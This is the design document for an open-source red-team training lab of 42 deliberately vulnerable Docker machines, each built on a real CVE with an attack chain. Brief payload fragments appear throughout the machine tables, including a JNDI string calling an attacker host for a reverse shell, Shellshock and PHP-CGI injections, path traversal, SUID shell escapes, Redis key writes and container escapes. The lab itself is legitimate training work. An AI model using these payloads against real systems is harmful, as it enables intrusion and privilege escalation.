# 🏴 Local-Machine — Advanced Red Team Lab

> **42 isolated, multi-step challenge machines** built on critical/high-severity CVEs.
> Each machine enforces a realistic **MITRE ATT&CK kill chain** where every step is a hard dependency for the next.
> Inspired by **DEFCON CTF Finals, HITCON CTF Finals, BlackHat CTF Finals**.

---

## Table of Contents

1. [Design Philosophy](#1-design-philosophy)
2. [MITRE ATT&CK Coverage Matrix](#2-mitre-attck-coverage-matrix)
3. [Architecture & Isolation Model](#3-architecture--isolation-model)
4. [Health-Check & Auto-Recovery System](#4-health-check--auto-recovery-system)
5. [Challenge Machines (42)](#5-challenge-machines-42)
6. [CVE Chaining Philosophy](#6-cve-chaining-philosophy)
7. [Multi-Architecture & Escape Challenges](#7-multi-architecture--escape-challenges)
8. [Infrastructure Components](#8-infrastructure-components)
9. [Documentation Strategy](#9-documentation-strategy)
10. [Directory Structure](#10-directory-structure)
11. [Implementation Phases](#11-implementation-phases)
12. [Verification Plan](#12-verification-plan)

---

## 1. Design Philosophy

### 1.1 Core Principles

| Principle | Description |
|-----------|-------------|
| **Cogwheel Chaining** | Every CVE exploit is a gear — it only turns if the previous gear moved. No step can be skipped. Flags are gated behind sequential exploitation. |
| **MITRE ATT&CK Mapping** | Every machine maps to specific ATT&CK Tactics/Techniques. The full lab covers the entire framework. |
| **Real-World Severity** | Only **Critical (9.0+)** or **High (7.0+)** CVEs from real advisories. No toy vulnerabilities. |
| **Creative Intrusion** | Players must *think laterally* — chain CVEs in non-obvious ways. Inspired by top-tier CTF finals where the "how" matters more than the "what". |
| **Open Source Ready** | Every machine includes detailed writeups, exploit code, and educational context. Anyone can learn from it. |

### 1.2 Kill Chain Enforcement Model

Every machine enforces this sequential dependency:

```
┌─────────────┐    ┌──────────────┐    ┌─────────────┐    ┌──────────────────┐
│   RECON      │───▶│  ENUMERATION  │───▶│  EXPLOIT     │───▶│  POST-EXPLOIT    │
│              │    │              │    │              │    │                  │
│ Port scan    │    │ Service      │    │ CVE trigger  │    │ Priv-esc / pivot │
│ Service ID   │    │ version ID   │    │ Initial      │    │ Lateral movement │
│ OS fingerpr. │    │ Vuln confirm │    │ foothold     │    │ Data exfil       │
│              │    │ Attack surf. │    │ (user flag)  │    │ (root flag)      │
└─────────────┘    └──────────────┘    └─────────────┘    └──────────────────┘
     GATE 0              GATE 1             GATE 2              GATE 3
```

Each gate produces an artifact (credential, key, token, file) that is **required** to unlock the next gate.

---

## 2. MITRE ATT&CK Coverage Matrix

The 42 machines collectively cover the **entire** MITRE ATT&CK framework:

| ATT&CK Tactic | Technique IDs Covered | Machines |
|----------------|----------------------|----------|
| **Reconnaissance** | T1595 (Active Scanning), T1592 (Gather Host Info) | All 42 |
| **Resource Development** | T1587.001 (Develop Exploits), T1588.005 (Obtain Exploits) | 39–42 (Browser) |
| **Initial Access** | T1190 (Exploit Public App), T1133 (External Remote Svc) | 01–35, 22 (React2Shell) |
| **Execution** | T1059 (Command/Script), T1203 (Exploitation for Client Exec) | All 42 |
| **Persistence** | T1505.003 (Web Shell), T1053 (Scheduled Task/Cron) | 02, 06, 10, 17, 30 |
| **Privilege Escalation** | T1068 (Exploitation), T1548 (Abuse Elevation) | 36–38, 04, 05, 25 |
| **Defense Evasion** | T1036 (Masquerading), T1055 (Process Injection) | 20, 22, 34, 39–42 |
| **Credential Access** | T1003 (OS Credential Dump), T1552 (Unsecured Creds) | 13, 14, 22, 23, 26, 32 |
| **Discovery** | T1046 (Network Scan), T1082 (System Info) | All 42 |
| **Lateral Movement** | T1021 (Remote Services), T1550 (Use Alternate Auth) | 11, 19, 22, 23, 26 |
| **Collection** | T1005 (Data from Local System), T1039 (Network Share) | 32, 33, 35 |
| **Command & Control** | T1071 (Application Layer Protocol) | 29–31 (Network Appliance) |
| **Exfiltration** | T1041 (Exfil Over C2), T1048 (Exfil Over Alt Protocol) | 33–35 (Data Transfer) |
| **Impact** | T1489 (Service Stop), T1529 (System Shutdown) | 09 (Docker escape) |

---

## 3. Architecture & Isolation Model

### 3.1 Network Topology

```
                    ┌──────────────────────────────────┐
                    │         HOST MACHINE             │
                    │                                  │
  Player VPN ──────▶│  ┌──────────┐  ┌──────────────┐  │
  (WireGuard)       │  │ VPN GW   │  │  Web Portal  │  │
                    │  │ 10.10.0.2│  │  10.10.0.3   │  │
                    │  └────┬─────┘  └──────────────┘  │
                    │       │    infra_net 10.10.0.0/24 │
                    │       │                          │
                    │  ┌────┴────────────────────────┐ │
                    │  │      Docker Bridge Router    │ │
                    │  └────┬───┬───┬───┬───┬───┬──┘  │
                    │       │   │   │   │   │   │      │
                    │   ┌───┘ ┌─┘ ┌─┘ ┌─┘ ┌─┘ ┌─┘     │
                    │   ▼     ▼   ▼   ▼   ▼   ▼       │
                    │  m01  m02 m03 ... m40  m41       │
                    │ .1.0  .2.0 .3.0    .40.0 .41.0  │
                    │  /24   /24  /24     /24   /24    │
                    └──────────────────────────────────┘
```

### 3.2 Isolation Rules

| Rule | Implementation |
|------|---------------|
| **Network** | Each machine gets its own Docker bridge network (`10.10.{N}.0/24`). No inter-machine communication. |
| **Storage** | No shared volumes. Each machine has its own ephemeral storage. |
| **Process** | `--pid=host` is **never** used. Each container has its own PID namespace. |
| **Capability** | Minimal `cap_add`. Only machines requiring kernel exploits (35–37) get `SYS_PTRACE`. |
| **Secrets** | Flags are generated at build time via `FLAG_SEED` env var + machine ID hash. |

### 3.3 Deployment Modes

| Mode | Target | Details |
|------|--------|---------|
| **Local** | Developer laptop | `docker compose up` — direct access via Docker IPs |
| **Homelab/VPS** | Self-hosted server | VPN container exposes single UDP port; players connect via WireGuard |
| **School Server** | Restricted NAT | See `docs/school_server_deploy/` for two architecture options |

#### School Server — Option 1: Open Port Allowed
- WireGuard container bound to single allowed UDP port
- Admin-configured peer keys

#### School Server — Option 2: Outbound-Only
- Tailscale for admin management
- Cloudflare Tunnel or custom egress proxy for player access

---

## 4. Health-Check & Auto-Recovery System

### 4.1 Per-Container Health Checks

Every machine's `docker-compose.yml` includes:

```yaml
healthcheck:
  test: ["CMD-SHELL", "/healthcheck.sh"]
  interval: 30s
  timeout: 10s
  retries: 3
  start_period: 60s
```

Each `/healthcheck.sh` validates:
1. **Service is listening** on expected port(s)
2. **Vulnerability is exploitable** (lightweight self-test)
3. **Flag file exists** and is readable by intended user

### 4.2 Instance Lifecycle Manager

```
┌──────────────────────────────────────────────────────────┐
│                  lifecycle-manager.sh                      │
│                                                           │
│  FOR each machine container:                              │
│    1. Check uptime → if > 60 min → RESET                 │
│    2. Check health → if unhealthy (3x) → RESTART         │
│    3. Check status → if exited/dead → REVIVE             │
│                                                           │
│  RESET = docker compose down && docker compose up -d      │
│  RESTART = docker compose restart                         │
│  REVIVE = docker compose up -d                            │
│                                                           │
│  Runs via cron every 60 seconds                           │
│  Logs to /var/log/local-machine/lifecycle.log             │
└──────────────────────────────────────────────────────────┘
```

### 4.3 Maintenance Rules

| Rule | Value | Rationale |
|------|-------|-----------|
| **Max instance lifetime** | 60 minutes | Prevents state drift from exploitation |
| **Health check interval** | 30 seconds | Fast detection of crashed services |
| **Auto-revive on death** | Immediate | Container restarts within 60s of detection |
| **Scheduled full reset** | Every 60 min | Clean slate for next player |
| **Log retention** | 7 days | Enough for debugging, not enough to fill disk |

---

## 5. Challenge Machines (42)

### Category 1: Web Server & Runtime (01–07)

| # | Name | CVE | CVSS | ATT&CK Techniques | Multi-Step Kill Chain |
|---|------|-----|------|--------------------|-----------------------|
| 01 | **Log4Hell** | CVE-2021-44228 | 🔴 10.0 | T1190, T1059.004, T1548.001 | `nmap 10.10.1.x` → Discover Java web app on 8080 → Identify Log4j via headers → Craft JNDI payload `${jndi:ldap://attacker/a}` → Catch reverse shell → Find SUID binary → Exploit SUID → **root flag** |
| 02 | **SpringBreak** | CVE-2022-22965 | 🔴 9.8 | T1190, T1505.003, T1053.003 | `nmap` → Discover Spring Boot on 8080 → Detect Spring via `/actuator` → Class loader param manipulation → Write JSP webshell → Enumerate cron jobs → Hijack writable cron script → **root flag** |
| 03 | **PathFinder** | CVE-2021-41773 | 🔴 9.8 | T1190, T1068 | `nmap` → Apache 2.4.49 on 80 → Path traversal `/%2e%2e/%2e%2e/etc/passwd` → Enable CGI RCE → Low-priv shell → Identify kernel version → Exploit kernel CVE → **root flag** |
| 04 | **StrutsZone** | CVE-2017-5638 | 🔴 10.0 | T1190, T1059.004, T1548.003 | `nmap` → Struts2 on 8080 → Craft Content-Type OGNL injection → RCE as `tomcat` → Enumerate sudo rules → Exploit misconfigured sudo → **root flag** |
| 05 | **ShellShocked** | CVE-2014-6271 | 🔴 10.0 | T1190, T1059.004, T1548.001 | `nmap` → Apache + CGI on 80 → Inject `() { :; };` in User-Agent → Reverse shell → Find SUID `nmap` → `nmap --interactive` → **root flag** |
| 06 | **PHPocalypse** | CVE-2012-1823 | 🔴 9.8 | T1190, T1053.003 | `nmap` → PHP-CGI on 80 → Query string `?-s` leaks source → `?-d+allow_url_include=1+-d+auto_prepend_file=php://input` → RCE → Writable cron → **root flag** |
| 07 | **GhostCat** | CVE-2020-1938 | 🔴 9.8 | T1190, T1552.001 | `nmap` → Discover AJP on 8009 + HTTP on 8080 → Use Ghostcat tool to read `WEB-INF/web.xml` → Extract admin creds → Login to Tomcat Manager → Deploy WAR shell → **root flag** |

### Category 2: CMS & Web Application (08–14)

| # | Name | CVE | CVSS | ATT&CK Techniques | Multi-Step Kill Chain |
|---|------|-----|------|--------------------|-----------------------|
| 08 | **DrupalDoom** | CVE-2018-7600 | 🔴 9.8 | T1190, T1552.001, T1548.003 | `nmap` → Drupal on 80 → Drupalgeddon2 Form API RCE → Shell as `www-data` → Find MySQL creds in `settings.php` → Dump admin hash → Crack → `su` to admin user with sudo → **root flag** |
| 09 | **PressGrave** | CVE-2022-0739+ | 🔴 9.8 | T1190, T1003.003, T1611 | `wpscan` → WordPress on 80 → Identify vuln plugin → SQLi → Dump user hashes → Crack admin password → Theme editor PHP RCE → Shell → **Docker escape via shared socket** → **host root flag** |
| 10 | **BulletProof** | CVE-2019-16759 | 🔴 9.8 | T1190, T1053.003 | `nmap` → vBulletin on 80 → Pre-auth `widgetConfig` RCE → Shell → Discover hidden cronjob running as root → Write to cronjob script path → **root flag** |
| 11 | **Confluencer** | CVE-2022-26134 | 🔴 9.8 | T1190, T1021.004 | `nmap` → Confluence on 8090 → OGNL injection via URL `/${...}/` → RCE as `confluence` → Find SSH private key in home dir → Key reuse for `root` account → **root flag** |
| 12 | **GitLabyrinth** | CVE-2021-22205 | 🔴 10.0 | T1190, T1059.004 | `nmap` → GitLab on 80 → Upload DjVu file with ExifTool payload → RCE as `git` → Access GitLab Rails console → Reset admin password → Find root SSH key in admin repo → **root flag** |
| 13 | **GrafanLeak** | CVE-2021-43798 | 🔴 7.5 | T1190, T1552.001, T1021.004 | `nmap` → Grafana on 3000 → Plugin path traversal → Read Grafana config → Download SQLite DB → Extract stored creds → SSH spray → **root flag** |
| 14 | **JoomBleed** | CVE-2023-23752 | 🔴 7.5 | T1190, T1552.001, T1505.003 | `nmap` → Joomla on 80 → API info leak `/api/index.php/v1/config/application?public=true` → Get DB creds → Admin login → Template editor PHP RCE → Shell → sudo miscfg → **root flag** |

### Category 3: Framework & Library (15–22)

| # | Name | CVE | CVSS | ATT&CK Techniques | Multi-Step Kill Chain |
|---|------|-----|------|--------------------|-----------------------|
| 15 | **Ignition** | CVE-2021-3129 | 🔴 9.8 | T1190, T1021.004 | `gobuster` → Discover Laravel debug page → Ignition `_ignition/execute-solution` → `phar://` file write → RCE → Find root SSH key in `/opt` → **root flag** |
| 16 | **ThinkPwned** | CVE-2018-20062 | 🔴 9.8 | T1190, T1548.001 | `nmap` → ThinkPHP on 80 → `invokefunction` controller call → RCE → Find SUID `find` → `find . -exec /bin/sh -p \;` → **root flag** |
| 17 | **ImageTragick** | CVE-2016-3714 | 🔴 8.4 | T1190, T1053.003 | `nmap` → Image upload service → Craft MVG file with command injection → Shell → Cronjob running ImageMagick as root → Poison input dir → **root flag** |
| 18 | **ProtoPoison** | CWE-1321 | 🔴 9.8 | T1190, T1059.007 | `nmap` → Node.js API on 3000 → Fuzz JSON endpoints → Prototype pollution via `__proto__` → Poison EJS template options → Trigger SSTI → RCE → Container is root already → **root flag** |
| 19 | **PickleRick** | CWE-502 | 🔴 9.8 | T1190, T1021.006 | `nmap` → Python webapp on 5000 → Decode session cookie (base64) → Recognize Pickle format → Craft malicious Pickle → Replace cookie → RCE → Find Redis creds → Pivot to Redis instance → Write SSH key → **root flag** |
| 20 | **JWTwisted** | CVE-2022-21449 | 🔴 9.8 | T1190, T1550.001, T1090 | `nmap` → Java API on 8080 → Capture JWT → Algorithm confusion attack → Forge admin token → Access internal SSRF endpoint → Reach internal service → RCE → **root flag** |
| 21 | **WebLogicBmb** | CVE-2019-2725 | 🔴 9.8 | T1190, T1059.004 | `nmap` → WebLogic on 7001 → Discover T3/IIOP on 7001 → XMLDecoder deserialization via `/_async/AsyncResponseService` → RCE → Already root in container → **root flag** |
| 22 | **React2Shell** | CVE-2025-55182 | 🔴 10.0 | T1190, T1059.007, T1021.004 | `nmap` → Next.js App Router on 3000 → Identify RSC Flight protocol endpoint → Craft malicious serialized React Server Component payload → Trigger insecure deserialization in Flight protocol → RCE as `node` → Enumerate internal services via `process.env` → Discover database credentials → Pivot to internal PostgreSQL → Dump SSH keys from `secrets` table → SSH as privileged user → sudo miscfg → **root flag** |

> **🔥 Machine 22 — React2Shell Deep Dive**
>
> CVE-2025-55182 is a **CVSS 10.0** insecure deserialization in React Server Components (RSC) "Flight" protocol. Affects Next.js 14.x/15.x/16.x App Router, plus any framework bundling `react-server-dom-webpack`, `react-server-dom-parcel`, or `react-server-dom-turbopack` (React 19.0.0–19.2.0). A single crafted HTTP request achieves unauthenticated RCE. This machine is particularly interesting because:
> - The attack surface is **the framework itself**, not misconfiguration
> - Players must understand React's internal serialization format
> - The post-exploitation chain involves reading Node.js `process.env` to pivot laterally
> - It demonstrates how modern "safe" frameworks can harbor critical deserialization bugs

### Category 4: Enterprise Middleware (23–28)

| # | Name | CVE | CVSS | ATT&CK Techniques | Multi-Step Kill Chain |
|---|------|-----|------|--------------------|-----------------------|
| 23 | **JenkinsOwned** | CVE-2024-23897 | 🔴 9.8 | T1190, T1552.004, T1021.004 | `nmap` → Jenkins on 8080 → CLI argument file read → Leak `master.key` + `hudson.util.Secret` → Decrypt stored SSH credentials → SSH as root → **root flag** |
| 24 | **ActiveMQtter** | CVE-2023-46604 | 🔴 10.0 | T1190, T1548.003 | `nmap` → ActiveMQ on 61616 + 8161 → ClassInfo ExceptionResponse deserialization → RCE as `activemq` → Enumerate sudo → Service account sudo escape → **root flag** |
| 25 | **RedisRaider** | Miscfg | 🔴 9.8 | T1190, T1098.004, T1053.003 | `nmap` → Redis on 6379 (no auth) → `CONFIG SET dir /root/.ssh` → Write authorized_keys → SSH as root → **root flag** |
| 26 | **MongoMayhem** | Miscfg + NoSQLi | 🔴 9.1 | T1190, T1552.001, T1550.001 | `nmap` → MongoDB 27017 (no auth) + webapp 80 → Connect to Mongo → Dump `users` collection → Find webapp admin creds → Login → NoSQLi in admin panel → RCE → **root flag** |
| 27 | **ElasticPwn** | CVE-2015-1427 | 🔴 9.8 | T1190, T1552.001 | `nmap` → Elasticsearch on 9200 → Groovy script sandbox escape via `_search` → RCE as `elasticsearch` → Read config files → Cred reuse for root → **root flag** |
| 28 | **SolrBlaze** | CVE-2019-17558 | 🔴 9.8 | T1190, T1552.001, T1021.004 | `nmap` → Solr on 8983 → Velocity template injection → RCE → Read log files → Extract SSH creds → SSH as root → **root flag** |

### Category 5: Network Appliance & Proxy (29–32)

| # | Name | CVE | CVSS | ATT&CK Techniques | Multi-Step Kill Chain |
|---|------|-----|------|--------------------|-----------------------|
| 29 | **BigIPwned** | CVE-2022-1388 | 🔴 9.8 | T1190, T1071.001 | `nmap` → F5 BIG-IP on 443 → Header auth bypass → iControl REST RCE → Already root → **root flag** |
| 30 | **CitrixBreaker** | CVE-2019-19781 | 🔴 9.8 | T1190, T1505.003 | `nmap` → Citrix ADC on 443 → Path traversal → Write Perl template → Trigger template → Webshell → RCE → **root flag** |
| 31 | **IvantiGate** | CVE-2024-21887 | 🔴 9.1 | T1190, T1059.004 | `nmap` → Ivanti Connect Secure on 443 → Auth bypass chain → Command injection → RCE → Already root → **root flag** |
| 32 | **MinIOLeaker** | CVE-2023-28432 | 🔴 9.8 | T1190, T1552.001, T1021.004 | `nmap` → MinIO on 9000 → `/minio/health/cluster` env var leak → Get S3 keys → Find SSH private key in bucket → SSH → **root flag** |

### Category 6: Data & File Transfer (33–35)

| # | Name | CVE | CVSS | ATT&CK Techniques | Multi-Step Kill Chain |
|---|------|-----|------|--------------------|-----------------------|
| 33 | **MOVEitMstr** | CVE-2023-34362 | 🔴 9.8 | T1190, T1003.003 | `nmap` → MOVEit Transfer on 443 → SQLi in session handling → Extract session tokens → Impersonate sysadmin → Deserialization RCE → **root flag** |
| 34 | **ApacheNght** | CVE-2023-25690 | 🔴 9.8 | T1190, T1036.005 | `nmap` → Apache reverse proxy on 80 → HTTP Request Smuggling → Bypass auth on internal admin → Access management API → RCE → **root flag** |
| 35 | **GoAnywher** | CVE-2023-0669 | 🔴 9.8 | T1190, T1059.004 | `nmap` → GoAnywhere MFT on 8000 → Discover License portal → AES-encrypted serialized Java object → Blind deserialization → RCE → **root flag** |

### Category 7: Privilege Escalation Chains (36–38)

| # | Name | CVE | CVSS | ATT&CK Techniques | Multi-Step Kill Chain |
|---|------|-----|------|--------------------|-----------------------|
| 36 | **BaronSamedit** | CVE-2021-3156 | 🔴 7.8 | T1190, T1068 | `nmap` → PHP upload on 80 → Upload webshell → Low-priv shell → Identify sudo 1.8.x → Heap-based buffer overflow in `sudoedit -s` → **root flag** |
| 37 | **PwnKit** | CVE-2021-4034 | 🔴 7.8 | T1190, T1068 | `nmap` → Python webapp on 5000 → Jinja2 SSTI → Low-priv shell → Exploit polkit `pkexec` env variable injection → **root flag** |
| 38 | **DirtyPipe** | CVE-2022-0847 | 🔴 7.8 | T1190, T1090, T1068 | `nmap` → SSRF endpoint on 80 → Pivot to internal webapp → SSTI → Low-priv shell → Overwrite `/etc/passwd` via splice pipe bug → **root flag** |

### Category 8: Advanced Exploitation (39–42)

#### Sub-Category 8A: Browser Engine Exploitation (V8/WebKit)

> Binary exploitation targeting JavaScript engine JIT compiler bugs.
> Players connect to a **vulnerable d8/jsc REPL via netcat** or submit scripts to an **automated headless browser** harness.
>
> **Binary Distribution**: Pre-built vulnerable binaries are provided via **GitHub Releases** for each machine. Source build instructions are documented in `v8-build/BUILD_FROM_SOURCE.md` and `jsc-build/BUILD_FROM_SOURCE.md` for users who want to compile from the exact vulnerable commit themselves.

| # | Name | CVE | CVSS | Difficulty | Exploitation Concept |
|---|------|-----|------|------------|---------------------|
| 39 | **V8_MapRem** | CVE-2018-17463 | 🔴 8.8 | 🟢 Entry | **CheckMaps Elimination** — JIT compiler skips type checks → Type confusion → Build `addrof`/`fakeobj` primitives → Arbitrary R/W → Execute shellcode via Wasm RWX page |
| 40 | **V8_TurboConf** | CVE-2020-6418 | 🔴 8.8 | 🟡 Medium | **TurboFan Type Confusion** — Side-effect modeling bug in `JSCreate` → OOB array access → Corrupt ArrayBuffer backing store → Arbitrary R/W → Wasm shellcode |
| 41 | **V8_OOBArray** | CVE-2021-30632 | 🔴 8.8 | 🟡 Medium | **TurboFan OOB Write** — Incorrect range analysis in JIT → JSArray length corruption → Leak compressed pointers → Sandbox bypass → Shellcode |
| 42 | **JSC_JITRCE** | CVE-2020-9802 | 🔴 8.8 | 🔴 Hard | **WebKit DFG JIT** — Optimization bug in DFG → `addrof`/`fakeobj` → Structure ID spray → JIT page RWX → Shellcode with PAC bypass considerations |

#### Sub-Category 8B: Docker & Sandbox Escape (gated behind `--enable-escape-challenges`)

These are **not separate machines** — they are **post-exploitation stages embedded into existing machines**.

> **⚠️ SAFETY**: Escape challenges are **disabled by default**. They must be explicitly enabled via:
> ```bash
> ./run.sh up --enable-escape-challenges
> ```
> When this flag is not set, the escape-relevant misconfigurations (mounted Docker socket, `--privileged`, weak cgroup) are **stripped from the compose files** at runtime. The machines still work for their primary kill chain, but the escape post-exploitation path is locked.
>
> **Hosting users** should **never** enable this flag unless running inside a **disposable VM**.

| Technique | Embedded In | ATT&CK | How It Works | Enabled By |
|-----------|------------|--------|-------------|------------|
| **Docker Socket Escape** | Machine 09 (PressGrave) | T1611 | WordPress container has `/var/run/docker.sock` mounted → spawn host-level container | `--enable-escape-challenges` |
| **Privileged Container Escape** | Machine 21 (WebLogicBmb) | T1611 | Container runs `--privileged` → Mount host filesystem via `/dev/sda1` | `--enable-escape-challenges` |
| **cgroup Escape (CVE-2022-0492)** | Machine 38 (DirtyPipe) | T1611 | After kernel exploit → Escape cgroup v1 via `release_agent` | `--enable-escape-challenges` |
| **runC Escape (CVE-2019-5736)** | Machine 09 alt path | T1611 | Overwrite host `runc` binary via `/proc/self/exe` symlink | `--enable-escape-challenges` |

#### Sub-Category 8C: Multi-Architecture Exploitation (mandatory, separate compose files)

Multi-architecture variants use **dedicated docker-compose override files** that are always available:

```bash
# Standard x86_64 machine
docker compose -f docker-compose.yml up -d

# ARM variant (requires qemu-user-static on host)
docker compose -f docker-compose.yml -f docker-compose.arm64.yml up -d

# MIPS variant (requires qemu-user-static on host)
docker compose -f docker-compose.yml -f docker-compose.mips.yml up -d
```

| Arch Target | Machine | Compose File | How It Works |
|-------------|---------|-------------|-------------|
| **ARM (aarch64)** | Machine 39 (V8_MapRem) | `docker-compose.arm64.yml` | QEMU user-mode emulation. d8 binary compiled for ARM. Player must write ARM shellcode. Bonus flag. |
| **MIPS (mipsel)** | Machine 25 (RedisRaider) | `docker-compose.mips.yml` | Redis compiled for MIPS via `buildx`. Player must adapt payload for MIPS. Bonus flag. |
| **macOS/iOS Concepts** | Machine 42 (JSC_JITRCE) | N/A (educational) | JSC binary from WebKit. Writeup covers PAC bypass theory. Exploit runs on x86 but documents ARM64e differences. |

> **Prerequisite**: Multi-arch support requires `qemu-user-static` installed on the host:
> ```bash
> # Debian/Ubuntu
> sudo apt-get install qemu-user-static binfmt-support
> # Verify
> docker run --rm --privileged multiarch/qemu-user-static --reset -p yes
> ```

---

## 6. CVE Chaining Philosophy

### 6.1 The Cogwheel Principle

```
    ┌─────┐     ┌─────┐     ┌─────┐     ┌─────┐
    │CVE-A│────▶│CVE-B│────▶│Misc.│────▶│CVE-C│
    │Scan │     │RCE  │     │Cred │     │Priv │
    │Info │     │Init │     │Reuse│     │Esc  │
    └─────┘     └─────┘     └─────┘     └─────┘
      Gear 1      Gear 2      Gear 3      Gear 4
```

**No gear turns without the previous one.** Examples:

| Machine | Gear 1 (Recon) | Gear 2 (Foothold) | Gear 3 (Pivot) | Gear 4 (Root) |
|---------|---------------|-------------------|----------------|---------------|
| 09 PressGrave | WPScan finds vuln plugin | SQLi dumps hashes | Theme editor RCE | Docker socket escape |
| 22 JenkinsOwned | Nmap finds Jenkins | CLI file read leaks keys | Decrypt stored secrets | SSH as root |
| 37 DirtyPipe | Nmap finds web service | SSRF reaches internal app | SSTI gives low shell | Kernel exploit to root |

### 6.2 What Makes It "Creative"

- **Non-obvious pivots**: Machine 19 chains a Python deserialization into a Redis lateral move
- **Cross-protocol chaining**: Machine 07 chains AJP (binary protocol) with HTTP Tomcat Manager
- **Data as weapons**: Machine 22 uses leaked cryptographic keys to decrypt other secrets
- **Environment abuse**: Machine 09 uses Docker itself as the escalation vector

---

## 7. Multi-Architecture & Escape Challenges

### 7.1 Implementation Strategy

| Feature | Approach |
|---------|----------|
| **ARM binaries** | `docker buildx` with `--platform linux/arm64` + QEMU user-mode (`qemu-user-static`). Dedicated `docker-compose.arm64.yml` per machine. |
| **MIPS binaries** | Cross-compilation via `mipsel-linux-gnu-gcc` in build stage. Dedicated `docker-compose.mips.yml` per machine. |
| **Docker escape** | Intentionally misconfigured containers — **gated behind `--enable-escape-challenges` flag** for host safety |
| **Sandbox escape** | V8/JSC sandbox bypass as part of browser exploitation chain |
| **iOS/macOS concepts** | Educational writeups documenting PAC, AMFI, and sandbox differences |

### 7.2 Safety Controls

> **⚠️ CAUTION**: Docker escape machines expose **real attack surface** on the host. They MUST run inside a dedicated VM or with strict AppArmor/SELinux profiles.

| Control | Implementation |
|---------|---------------|
| **VM isolation** | Escape machines recommend running inside a throwaway VM |
| **AppArmor profile** | Custom profile restricting host filesystem access |
| **Non-root Docker daemon** | Rootless Docker mode for escape challenges |
| **Network restriction** | Escape machines cannot reach other machines' networks |

---

## 8. Infrastructure Components

### 8.1 VPN Gateway

```yaml
# infra/vpn/docker-compose.yml
services:
  wireguard:
    image: linuxserver/wireguard
    cap_add: [NET_ADMIN, SYS_MODULE]
    ports:
      - "51820:51820/udp"
    volumes:
      - ./config:/config
    networks:
      - infra_net
```

### 8.2 Web Portal (with Light Gamification)

A lightweight web dashboard with a clean, simple UI and light gamification elements:

**Core Dashboard:**
- Machine list with live status (🟢 Running / 🔴 Down / 🟡 Resetting)
- Difficulty ratings and category badges
- Health check status per machine
- Connection instructions (IP, ports, VPN config)

**Gamification Features:**
- **Flag submission** — Players submit flags (user + root) per machine
- **Point values** — Machines award points based on difficulty (Easy: 10, Medium: 25, Hard: 50, Insane: 100)
- **Player profile** — Track owned machines, total points, completion percentage
- **Progress heatmap** — Visual grid showing which machines a player has completed across categories
- **First blood badge** — Indicator for the first player to submit a valid root flag per machine
- **No public leaderboard** — Gamification is personal progress only, no competitive ranking (keeps focus on learning)

> The portal is intentionally simple — no user registration database. Players authenticate via a shared secret or VPN certificate identity. It's a flat JSON file backend, not a production SaaS.

### 8.3 Flag Generation

```bash
# Each machine generates its flag deterministically:
FLAG=$(echo -n "${FLAG_SEED}:machine_${MACHINE_ID}" | sha256sum | cut -c1-32)
echo "FLAG{${FLAG}}" > /root/root.txt
echo "FLAG{$(echo -n "${FLAG_SEED}:user_${MACHINE_ID}" | sha256sum | cut -c1-32)}" > /home/user/user.txt
```

---

## 9. Documentation Strategy

### 9.1 Document Matrix

| Document | Audience | Content |
|----------|----------|---------|
| `README.md` | Everyone | 30-second overview, quick start, project goals |
| `docs/01_SETUP.md` | Admin | Prerequisites, installation, first run |
| `docs/02_ARCHITECTURE.md` | Admin/Dev | Network topology, isolation model, security boundaries |
| `docs/03_ADMIN_GUIDE.md` | Admin | Day-to-day ops: reset machines, manage health, manage VPN peers |
| `docs/04_PLAYER_GUIDE.md` | Player | Connect via VPN, pick a machine, methodology guide, flag format |
| `docs/05_ANONYMOUS_USER.md` | Anyone | Extended idiot-proof README for totally new users |
| `docs/school_server_deploy/` | School Admin | NAT traversal options, firewall configs |

### 9.2 Per-Machine Documentation

Every machine directory contains:

```
machines/XX_Category/NN-machine-name/
├── docker-compose.yml          # Machine definition
├── Dockerfile                  # Build instructions
├── healthcheck.sh              # Health validation script
├── config/                     # Service configs, vuln setup scripts
├── flags/                      # Flag generation script
├── README.md                   # Machine card: difficulty, CVE, hints
└── writeup/
    ├── solution.md             # Full step-by-step walkthrough
    ├── exploit.py / exploit.js # Working exploit code
    └── references.md           # CVE links, original advisories, patches
```

---

## 10. Directory Structure

```
Local-Machine/
├── docker-compose.yml                    # Core infra only (VPN + Portal)
├── run.sh                                # Admin CLI (up/down/reset/status)
├── lifecycle-manager.sh                  # Health-check & auto-recovery daemon
├── .env                                  # Global config (FLAG_SEED, subnet base)
├── README.md                             # Project overview
├── LICENSE                               # Open source license
├── CONTRIBUTING.md                       # How to add new machines
│
├── docs/
│   ├── 01_SETUP.md
│   ├── 02_ARCHITECTURE.md
│   ├── 03_ADMIN_GUIDE.md
│   ├── 04_PLAYER_GUIDE.md
│   ├── 05_ANONYMOUS_USER.md
│   ├── MITRE_ATTACK_MAP.md               # Full ATT&CK coverage visualization
│   └── school_server_deploy/
│       ├── Option1_VPN_Allowed.md
│       └── Option2_Outbound_Only.md
│
├── infra/
│   ├── vpn/
│   │   ├── docker-compose.yml
│   │   └── config/
│   ├── portal/
│   │   ├── docker-compose.yml
│   │   ├── Dockerfile
│   │   └── src/
│   └── shared/
│       ├── healthcheck-base.sh           # Base health check template
│       └── flag-generator.sh             # Deterministic flag generation
│
├── machines/
│   ├── 01_WebServer_Runtime/             # Machines 01–07
│   │   ├── 01-log4hell/
│   │   │   ├── docker-compose.yml
│   │   │   ├── Dockerfile
│   │   │   ├── healthcheck.sh
│   │   │   ├── config/
│   │   │   ├── flags/
│   │   │   ├── README.md
│   │   │   └── writeup/
│   │   │       ├── solution.md
│   │   │       ├── exploit.py
│   │   │       └── references.md
│   │   ├── 02-springbreak/
│   │   ├── 03-pathfinder/
│   │   ├── 04-strutszone/
│   │   ├── 05-shellshocked/
│   │   ├── 06-phpocalypse/
│   │   └── 07-ghostcat/
│   │
│   ├── 02_CMS_WebApp/                    # Machines 08–14
│   │   ├── 08-drupaldoom/
│   │   ├── 09-pressgrave/                # Docker socket escape path
│   │   ├── 10-bulletproof/
│   │   ├── 11-confluencer/
│   │   ├── 12-gitlabyrinth/
│   │   ├── 13-grafanleak/
│   │   └── 14-joombleed/
│   │
│   ├── 03_Framework_Library/             # Machines 15–22
│   │   ├── 15-ignition/
│   │   ├── 16-thinkpwned/
│   │   ├── 17-imagetragick/
│   │   ├── 18-protopoison/
│   │   ├── 19-picklerick/
│   │   ├── 20-jwtwisted/
│   │   ├── 21-weblogicbmb/              # Privileged container escape
│   │   └── 22-react2shell/              # CVE-2025-55182 RSC Flight deser
│   │
│   ├── 04_Enterprise_Middleware/         # Machines 23–28
│   │   ├── 23-jenkinsowned/
│   │   ├── 24-activemqtter/
